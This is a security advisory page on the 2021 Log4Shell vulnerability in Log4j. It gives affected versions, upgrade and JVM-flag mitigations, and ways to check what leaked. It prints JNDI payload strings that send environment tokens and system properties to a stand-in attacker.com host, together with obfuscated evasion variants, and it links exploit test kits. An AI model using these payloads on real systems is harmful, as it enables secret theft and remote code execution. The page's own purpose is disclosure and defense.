---
title: "foojay – a place for friends of OpenJDK"
description: "foojay is the place for all OpenJDK Update Release Information. Learn More."
canonical: "https://foojay.io/log4j-cve/"
url: "/log4j-cve/"
aliases:
  - "/log4j-cve/"
frozen: false
---

On Dec.10, 2021, a new, critical [Log4j](https://logging.apache.org/log4j/2.x/) vulnerability was disclosed: [Log4Shell](https://techcrunch.com/2021/12/10/apple-icloud-twitter-and-minecraft-vulnerable-to-ubiquitous-zero-day-exploit/).

This vulnerability within the popular Java logging framework was published as [CVE-2021-44228](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720) and categorized as `Critical` with a CVSS score of 10, which is the highest score possible. The vulnerability was discovered by Chen Zhaojun from Alibaba's Cloud Security team.

All current versions of log4j2 up to and including 2.14.1 are vulnerable. You can remediate this vulnerability by updating to [version 2.15.0 or later](https://logging.apache.org/log4j/2.x/download.html).

Many application frameworks in the Java ecosystem use this logging framework by default. For instance, Apache Struts 2, Apache Solr, and Apache Druid are all affected. Aside from those, Apache log4j is also used in many Spring and Spring Boot applications, so we suggest you check your applications and update them to the latest version.

**Brian Vermeer, Foojay Java Security Community Manager**

(Read the complete article on [Snyk.io](https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-4428/).)

The above describes the RCE (remote code execution vulnerability), illustrated below by [GovCERT.ch](https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/#general):
![](/images/pages/log4j-cve/image-13-1024x692.png)

Note the following on the attack vulnerabilities relating to system properties, environment variables, and deserialization, provided by [Lari Hotari from DataStax](https://gist.github.com/lhotari/18292c08586d1982e88658d239f02c57).

## LDAP Attack Vectors on Recent Java Versions

Let's ask ourselves the question how and to what extent an LDAP attack vector impacts JDKs.

The LDAP attack vector exists and there are several forms of LDAP attack vectors:

* leakage of system properties and environment properties with LDAP calls
* possible DoS attacks with LDAP calls
* LDAP deserialization attacks resulting from the RCE

## Using LDAP calls to leak information about environment variables and system properties

Examples:

```
${jndi:ldap://${env:VAULT_TOKEN}.tokens.attacker.com/a} 
${jndi:ldap://${sys:java.vm.version}.tokens.attacker.com/a}
```

Notice, there are several evasion techniques, some examples:

* `${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}`
* `${${lower:-j}${lower:-n}${lower:-d}${lower:-i}:${lower:-l}${lower:-d}${lower:-a}${lower:-p}://attacker.com/a}`

### Finding out what could have been leaked

* Listing system properties of an active Java process
  * Use `jinfo -sysprops <pid>` to list system properties
* Listing environment variables
  * On Linux, you can list environment variables available in a process with `cat /proc/<pid>/environ | xargs -0 -n 1 echo`

For docker / k8s containers without a shell or when jinfo doesn't exist, you can use <https://github.com/apangin/jattach> with the `properties` command. jattach could be run on the docker host / k8s node. The `cat /proc/<pid>/environ | xargs -0 -n 1 echo` solution works also on the docker host / k8s node. The pid is the host pid in that case.

## LDAP deserialization attacks resulting from the RCE

This is one of the points of the blog post [PSA: Log4Shell and the current state of JNDI injection](https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/), it contains references to other sources with more details (f.e. [Exploiting JNDI injections in JDK 1.8.0_191+](https://www.veracode.com/blog/research/exploiting-jndi-injections-java#:~:text=exploiting%20jndi%20injections%20in%20jdk%201.8.0_191%2B)).

LDAP deserialization attacks are possible even on latest Java versions. Deserialization is enabled by default. It can be disabled on most recent Java versions. For example, with system properties:

```
"-Djdk.serialFilter=!*" "-Djdk.jndi.object.factoriesFilter=!*" "-Dcom.sun.jndi.ldap.object.trustSerialData=false"
```

could be used to disable remote object deserialization when using LDAP over JNDI. These settings could break applications depending on the serialization being enabled and using JNDI. The javadocs in JDK17 contain more information:

* jdk.jndi.object.factoriesFilter and com.sun.jndi.ldap.object.trustSerialData in [java.naming module summary](https://docs.oracle.com/en/java/javase/17/docs/api/java.naming/module-summary.html)
* syntax for filters described in [ObjectInputFilter.Config#createFilter](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectInputFilter.Config.html#createFilter(java.lang.String))

There's also [Java Serialization Filtering](https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html#GUID-3ECB288D-E5BD-4412-892F-E9BB11D4C98A) documentation and [JEPS-290](http://openjdk.java.net/jeps/290). The controls are featured at least in:

* [8u311 release notes](https://www.oracle.com/java/technologies/javase/8u311-relnotes.html)
* [8u291 release notes](https://www.oracle.com/java/technologies/javase/8u291-relnotes.html)
* [11.0.11 release notes](https://www.oracle.com/java/technologies/javase/11-0-11-relnotes.html)

## Other information

* <https://github.com/lhotari/log4shell-mitigation-tester> for testing mitigations \& exploits
* Rogue JNDI <https://github.com/veracode-research/rogue-jndi> for testing JNDI RCE exploits and related information
* JNDI-Exploit-Kit <https://github.com/pimps/JNDI-Exploit-Kit> for testing JNDI RCE exploits and related information
* Cybereason has released a runtime patch for Log4Shell very cleverly called Logout4Shell: <https://github.com/Cybereason/Logout4Shell>

## Relevant Tweets

 <a target="_blank" href="https://twitter.com/malwaretechblog/status/1469289471463944198">{{< img src="/images/pages/log4j-cve/image-950x1024.png" alt="" width="436" height="469" >}}</a>

 <a target="_blank" href="https://twitter.com/malwaretechblog/status/1470096336133373954">{{< img src="/images/pages/log4j-cve/kryptos-1024x1000.png" alt="" width="438" height="428" >}}</a>

 <a target="_blank" href="https://twitter.com/TomGranot/status/1469704635715706885">{{< img src="/images/pages/log4j-cve/checking-1024x802.png" alt="" width="440" height="345" >}}</a>
